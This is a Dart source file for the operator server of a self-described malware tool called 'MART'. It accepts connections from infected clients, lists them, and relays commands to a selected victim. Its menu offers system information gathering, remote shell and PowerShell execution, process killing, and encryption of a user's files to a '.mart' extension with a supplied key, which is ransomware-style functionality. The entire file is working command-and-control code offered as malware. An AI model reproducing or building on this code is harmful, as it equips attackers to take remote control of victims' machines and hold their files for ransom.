import 'dart:io';
import 'package:server/models/client.dart';

ServerSocket serverSocket;
String ip = "127.0.0.1";
int port = 6662;

List<Client> clients = [];
Client clientSelected;
String STATE = "MENU";
String menu = """
\x1B[36m
                __       
          _____/* |     ____    
                `-,`-._,'---'
                  `, `)--` 
                  __)/ 
                    /|`
\x1B[0m
        MART
        \x1B[31mMalware\x1B[0m
        \x1B[36mdART\x1B[0m

        by BOT4

        Options:
        /list - List the Clients connected
        /set id - Enter the command interface
        /exit - Exit to command interface

        Commands Avaible:
        * Get Information from System:  {"id": "1"} 
        * Run Command on System:  {"id": "2", "parameter": "ipconfig"}
        * Run Command on System through powershell *(Windows only): {"id": "3", "parameter": "ls"}
        * Kill Process in the System: {"id": "4", "parameter": "4517"}
        * Encrypt files from selected path to .mart:  {"id": "5", "path":"C:\\Users\\const\\", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO" }   
        * Decrypt files(.MART) from selected path:  {"id": "6, "path":"C:\\Users\\const\\", "key":"oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO" }
        
  """;

main() {
  print(menu);
  print("      ðŸŸ¢ Server listen: ${ip}:${port}");

  ServerSocket.bind(ip, port).then((ServerSocket server) {
    serverSocket = server;
    serverSocket.listen(
      (Socket socketClient) {
        Client newClient = new Client(socketClient);
        newClient.listener((String message) {
          print(message);
        });
        clients.add(newClient);
        print(
            "      \x1B[32m${newClient.ip}:${newClient.port}\x1B[0m Connected");
      },
      onError: catchError,
      onDone: () {
        print("Finish Connec");
      },
      cancelOnError: true,
    );
  }).catchError(catchError);

  stdin.listen((data) {
    String dataString = new String.fromCharCodes(data).trim();
    try {
      optionsMenu(dataString);
    } catch (error) {
      print("Error in input: ${error.toString()}");
    }
  });
}

catchError(error) {
  print("ðŸ”´ Server listen, ${error.toString()}");
  STATE = "MENU";
}

optionsMenu(data) {
  switch (STATE) {
    case "MENU":
      if (data.contains("/list")) {
        print("Id  |  Host  |  Os  |  Lang");
        clients.forEach((client) {
          int indexClient = clients.indexOf(client);
          print(
              "${indexClient}  |  ${client.ip}:${client.port}  |  ${client.os}  |  ${client.lang}");
        });
      } else if (data.contains("/set")) {
        int indexSet = int.parse(data.split(" ")[1]);
        clientSelected = clients[indexSet];
        print("Command set to client id ${indexSet}, type /menu to back");
        STATE = "COMMAND";
      }
      break;
    case "COMMAND":
      if (data.contains("/exit")) {
        print(menu);
        STATE = "MENU";
      } else {
        clientSelected.sendMessage(data + '\n\r');
      }
      break;
  }
}
